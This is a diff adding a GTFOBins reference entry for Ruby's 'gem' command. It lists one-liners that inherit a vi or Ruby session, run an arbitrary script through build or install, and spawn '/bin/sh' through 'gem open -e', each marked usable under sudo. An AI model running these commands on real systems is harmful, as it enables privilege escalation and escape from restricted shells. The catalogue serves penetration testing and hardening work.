@@ -1,0 +1,33 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/gem -->
+---
+functions:
+  inherit:
+  - code: |-
+      gem open debug
+    comment: |-
+      This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.
+    contexts:
+      sudo:
+      unprivileged:
+    from: vi
+  - code: |-
+      gem build /path/to/script.rb
+    contexts:
+      sudo:
+      unprivileged:
+    from: ruby
+  - code: |-
+      gem install --file /path/to/script.rb
+    contexts:
+      sudo:
+      unprivileged:
+    from: ruby
+  shell:
+  - code: |-
+      gem open -e '/bin/sh -s' debug
+    comment: |-
+      This requires the name of an installed gem to be provided, e.g., `debug` is usually installed.
+    contexts:
+      sudo:
+      unprivileged:
+...
